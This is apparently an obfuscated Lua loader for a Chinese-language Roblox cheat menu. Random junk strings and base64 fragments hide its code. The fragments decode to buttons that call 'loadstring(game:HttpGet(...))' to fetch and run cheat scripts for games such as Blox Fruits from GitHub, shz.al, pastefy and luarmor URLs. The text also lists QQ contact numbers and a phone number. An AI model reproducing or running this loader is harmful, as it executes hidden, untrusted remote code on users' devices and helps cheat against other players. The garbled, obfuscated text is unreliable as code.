arrior.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sedaKkdYwgPjDJDJPCebmmBXpvolRNKbnsiPCMGluTQeiNRBlstvgaYrWOTCgjPRFsMHamKSx0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')只因剑（3巨剑战士）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VcLUDEGIumgUIJyYoFnslifQKCgXvKEYjurWTNXQVVwioEezilzWYeBeXMNCvqHyoHceZOLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0SwordWarriorstZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EMrTxOBlxwvCbXfiGwZXwrGqDkyDCyWZcfjFBdFZrZDIHlKkkGnvIFpamcSbbaLhOksoWWKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IkUBTczXRBBQFzCsunvhUgXJdlQqQcUSqTZZKSWqKxnPgdjfIgrbITErfOxmNixqEimSsWLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xFhfcCmKmTEdYnuwxrvkzhykzySoBtfxOYomibvHYyUNsiVcAvdFwELnKTVzUiqiySIaVvamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kVBhTabpQObmYVsyqLiwvgOiYDzPXkmAukBBsWXsAlhIhVJcIVkPFcoTFtUREQceUEFnatamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kweXwRPssRJwtpNOmNNRnxPoelTuysnGHRAZAYGCLMgPSInKtUJKMekpUfuDacJIoDYETObG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LeDdCLuaWHkNUDuastRyaUjxVGQhmDJyZKzFYzADXdDZfOqJymWKWFMBFyGOcUHAovemhWKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')战争大亨脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yPQrUxAjPBCpeAZZxbezYhYOqXmlpCEQsheiZlIECjMbYcRMIRThPxWmTuOkoonwdlSyJwLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eJntYjQhcMnIkqdDRQvetWnbwVnicPWuEUvGSnqpgMMnmIBuECLVqJDBMhHqjOWukHxoWyKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KuCQodiCzHbPcvzMaoKihQSNmLIzEQMHhVjwtbCGHRJDmFcCXPespiIrlLUhpHXyZCJfJBLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')战争大亨tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CaFPEZgVbalQCJQeROYcFiEIsddkIZvkCQThpdaeWeVEMhAjwaRFUlFElcyRECRsFfbMCZLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldA==')https://raw.githubusercontent.com/Macintosh1983/ChillHubMain/main/ChillHubOilWarfareTycoon.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FwEWsArEUDOMapHTUDJpKjonRTPVgQTSdMWWAsuVjOLxIaXCNLMvmOhIbljxEXudHAtljTKSgpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')狼脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XuZXafDGkKBJUMkqQftXkmwuKmdsGCFnzJqEehnzHUKOQrxSzPFfHSLneICKGvGibQvrayLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~WarTycoontZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ggfcVGWXdZGdUlQPYhBCTMOANnuQCnwlkCFGsCegqofVKvlBBUFWUYZaOUlITYnBMkCdhHKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NBTqlNDDPfslYlwUKMueKJqVMZupsgXPkOxSjamNcRUVmpoyqwuMvTquMLywNQBDakJwkwLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zfbvdTKzNbrgbwpmLzYRIgIkquhdyDsglFwuQwDAEsFtqWPXXSWQNKQKBLaxLEbNVfufSoamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lnRRZYdstuHnXbmIgwOxWtowNulkVhChqLGFhnhRfNcIDsjAtofBbClvHsCGaiYLvpTPhKamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xBgxsLDTBBXLcdqyAqzgVURuFJjRYHotQcJZFvTdGTGldXzWqceJMoTZKEJzPLpixKfIzdbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BahOvjxgonDLbiMHRBXPrVRTwDqcHldQDQnfHyqZRqbxQGoTNfOegnoauePuVxUafxZFFnKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')彩虹朋友tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nVfzfYUOaRQQIFCXJEtgZtZVeHeSJDjDyuPvOLKYbaavzCKTyRurzZHEEnfwbVvnsOwAcdLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nXzElUkHnnljLGNdprIvZiwdZSEKoLmjqGTHYpEBICCWStlmoTjqbBfGdVLhUhieScxBKpKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jgttvcmEjvhxJFconOGiMGBOJMxTnzDiNzgsEBvVWtllqSRVvCyNIEIjIMDvrGVQdhvBFVLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')彩虹朋友（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gbZPrPMOvgMnTyxnQHFPAtXwkaIeWXFciCvSseubjcEQotVmeJezJwumJMkZOzJsuvHxrLLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/XoNv04vR/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fZHULUIxEmdgRpnVvYDeTTKkIPJZiIMzKDFbhtKYZpIoPrzWtPynEVrtpkGDDUZhHwYjxCKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')彩虹朋友自动获胜tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JuZbQzBdtNGbOiVsKPLSHdCGtvYwKMdoOrdrsVhjfKebAqPFtyLwwWRUBzVGHjyHijSmpbLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~zkzkzisKAKAKKKKSStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qZMTSkfyKeJaBbVHsSOSyHbhTOAcHEjnwCChQtGKwIdAPNQsnuunfSHNZECvDzKqKmDNyXKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')彩虹朋友（推荐）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CQDaYOQmgCuTKPWXaVOmXDFYZUeFLlkRNRuKNFQKrFftiMAhfRleHShFFbEJMdpNcdNrbnLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/BorkWare/main/Scripts/tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HhwPzuVmsMjPYxmmGltJuIspuOyoKSZMvVFFhfkLDaHydSeSMlOUYpbPRoUjlrpegoMyXZIC4uIGdhbWUuR2FtZUlkIC4uIA==').luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SGVeqTgrXifKLKZPdvETtStZmqtCbsvKcDCmYoQPriuiNVwJfRbRImkuJqbWiLmTHuxmlxKSko') Watermelon ? tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sekzAWHoQIvSidiKUgIwRehDfInuEqxNjmxVycNYzJaSgkHyevnCwLuMoSlHCFKeYXubrcKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZwdTlZmpeJRxIYZeCzKOaGtBKirwBqiYzelgkXbQIlHajavaMuNHSdqpttCCRzNmbVFuKzLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bdHGCgMuhiGwZdGeaSDhYoqmhGQFhXNDWpBiIEdEAsWvsbUuiANnmqjOdzSwYUsoOkGbvZamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KzjdPqiYDuycAWfYFOJSwOsdaEhxswtWijreGYdgpFluScelBgFUPvCOJmkyxAWYGOAQUHamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MpiccypUCICMTJmzQSdcVHnvmPiemOYYWZuaXIPRDTMoRRBzWrZqkOPuYAOxRPkyFVdvoGbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XMwjHMbAWyHVFageKEWMCzGmKNcGxQcPRkVCJdAAjdyCztAKDLQyqKFJHMfQghqvfyLbsSKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')河北唐县tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('inQDQOJPDMSvFPaTHODEBYqXsyyoJYnoMMPcUDGSiYfWMPNoANPhUpbuEXGAnOgWDfZkYXLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JfeFGjYASPaWtZmuhiqbEDUSHdzRkedjfmqGXENFtvmjiPhofoxSpPmbkGfrZwBsWvdGVTKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VfAAkkzbuNsoeQKBLSjqMsXcwFHtgVWMnRQxTRQYyxgkPcDCVzdVgSNrqShQzZMCsCEGiZLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')河北唐县（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DMMymjXSXwdxryIJUqobNmDSSOIcEPRrnwMkOzUrfckIutzZwRiESXJhFVGqDDMCEyabUjLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Tang%20Country.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WqgQgsphSRvtChTBZckpgoccIheOxqKfHYbeUBlXyeDCLHEssLLuZAJPtuEUHoYWOZeHwbKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')河北唐县（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hQXIItAgeJrSLoOYaOCHuTcKIkziALvwYvFRVXSHaRerejPcWuCvQaWQSXlcIyoHlRjNSELGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/s20nni0h/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SpWYmQQlSjCvgIChhJhMxFTfcMIhdIXWyxaMZWXKnlpuQTowvtuwMDUWFigqvhcrKIBVumKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AGJNWSwkmRDqEAqodNgJuWZnVohYwSBMTCzJMMFVqWCyDakOEPUbseILcKCdrlwZtRKOVoLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KyBnQQWZsBlshYzZkWtGzYLfiRZVEVXZewuOZzuTKDpvJlxoHEfUWwqMRzUMOXufeuqfwNamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bbyKQrJJcoCBTjCikHAwixcxfTpPjceZwBCADXteztVkTPUEnHeroOYPHdVQzZNZDehSWtamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('myOUILZjhgXttfTrKZKHZnRfpZbWMDeDXJRvBkPOOGEAJvzBNJMDbBjYlStKzrxFsbpFVybG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tPaYFCNlvZLWCqdphNldDhGylhXfYyRoxWViMoeRWGKIgYVXEJUOdFmAPIPxYDbhffZDckKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')Blox FruittZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CAEfChjZFCFOlLBcIEsfMEJRcFwXfHCdHTPKFgInWSkQtkcfjwgXqdAZbHRqTyinkeXVrDLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KLYhelajQYpcaZErFmuOUtsvGIetWOjluNXrdDXxiuCfJWluQhhUgBpBZDhnwLmllGpXEYKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OTIgCkcYtBhycFzPujsLPhpRsZUEXKUAmdkcqbqpAHoovzaFmNvoyDYjYNstZOgEmzalOyLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')霖溺BFtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('imOFSukuzbxoLvrmpMtUJlgfWeEVKRYVuNLtCqFDQjdBObTWCVSHRsrIxvDfWOtMeShzAPLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KAKKKStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cNNzkYPsZQIBpVAgctHlxazAyfYXhFQUprjNRlhwxRUlboaoJkbtqLvuxyEyvYUDvTYdXxKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BF『HOHO脚本』链接不一样tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WvqzhzCQfVteAGYuxCPGubfCLKsBxMUpvXfhvfEnlFkVyFrTbuPNEpUkXTXhJBkFWdmoYpLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/acsu123/HohoV2/Free/BloxFruitFreeV3.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RxMjSuTRyFnorKYkWWnNskQRKdcgqbxhEsHZgoPnxMFohVgyCHhFgnwtrNqTWFebIAddbhKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BF『HOHIO脚本』链接不一样tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MrRYgigAzNYwoCQvGSpBoVTmuwumkMESjbdWgNjCQllvZCgOXqKWvKkRPfaZHnwMlWhxLALGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UItZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('leHYxjJyoxXAvUgpWkgxwNewOGpifSrquxyePYtzHeuVQtloIihJGNUWXIdfnSgeRPCoFvKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BF（听说第二强）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qXjueRAtHJemnnYvtCjMTZtIiFWzDNOioJZxIIIDMCkCNxTmdzDOmkLlVYGONTrFZCGpoALGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('StmhqmmEneuizJaQUfatKxZDrwDrMmRthLFyxeFSMoDVuTdqxoihZmWvHwYGONAibeAJdpKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BF（霖溺找的）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cNowdgxahqwfwAhAUMHEWoNrgtfeaCUQsjBmQJVUoxyOkLaXbLBjOPfgcNPnEVSPWXRrUZLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/RobloxScriptsExploit/Blox-Fruits/main/Ripper%20MtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ITeLbdAeeXVnxOnMVmzBfvWGeOStjIIxHColhcpGWbmDDCUezzrrvUiOEQhPLuEqJeusbzKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BF（自动箱子）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yzNeWPcsidwsBqTglTmsCioZfugRkzbvGIQQvAMDdNHGVaFdVhzTOfAYcggGiwzaCYFuQLLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/IceMael7/NewIceHub/main/BrookhaventZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PqnxlSfgVEKnTamSpQHWflvzFZVeFkkKmzhuyczgkuKswvnOZSzvzhpPnVmtaRUecjMANqKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BF（汉化）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QewGzWdZVHwZeUMKjFCDtqRuNrCRdYjYtIQprWxPEnogjPFOhZUoBWntyqgIZRkMiWWSeXLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/XiaoYunCN/Xiao-Yun-UWU/main/%E6%B5%B7%E8%B4%BC%E7%8E%8Bbf.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xtPlgMqzdBVUXJFenFDrUmucvrxlVYRAwEORqegzFFxSUKwDOjsuuwvQGbiAYHGsJJHjGpLCB0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BF（听说最屌）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eITGLElpqzXFfIPkauJSIdBokKBrTrIrdltzikrZxONWcDVldzJwFFEYHbLhgkpPieeNodLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/AkiraNus/UniquehubKak/main/FreeCr.XenonhubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wRBXYnoOmyDwpsdFfCYXgTZAijGcCigZVehzsddciHJrKcHYuTmqjkFSRixUytfAujZSqqKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BF（刷怪）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('iNmaCPsYopIYtsqFhzxnTxRKokAdKaVvHvPEYBLNQjQcGaGzSixlPzlNZbtnEXScgzwidqLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://rawscripts.net/raw/UPDATE-16-Blox-Fruits-Nub-V1-Hub-4583tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SPyQODfaIIFeaKZVcGjlTVVNDVUQoElOQpNbvBUtjXbewmcsNmeIJSXIGPnXWEospKJbnsKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BF脚本w-azure无密钥tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jiZdynGmaWucihLjpTWtgZscdjmZefPgoPIDmXiRFxpkAKCgHNhUHbFAuvvloSKJDUXAHRLGZ1bmN0aW9uKCkNCiAgICBnZXRnZW52KCkuVGVhbSA9IA==')PiratestZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CIAvMbnysugVVYVZKgWAGoUiVPZwQauOMNqVrDpBQKlJGSoRfCdhzEUHaACaQUeNkqmZrmbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQo')https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hXJqeNpxQSeymjNFWjOQKFRJWLRQxMhuTavZMNEHfYOSxhfIcAWAeVYfhyUOyenlOSQHWTKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BF（自动升级）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PbwhNupUyxTarPogZQQFfghPAAtjZsHSLcEWHgnylgVXVZWHOkovihmkgtLSuXUbeZwDntLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldA==')https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mzAYkOdAEqmcBgIrIIlUMmiQUlaLBhgZXoJxJSoSBTkBRNUzvARLdNPliEUeewwGCROCpEKSgpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')BFtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXX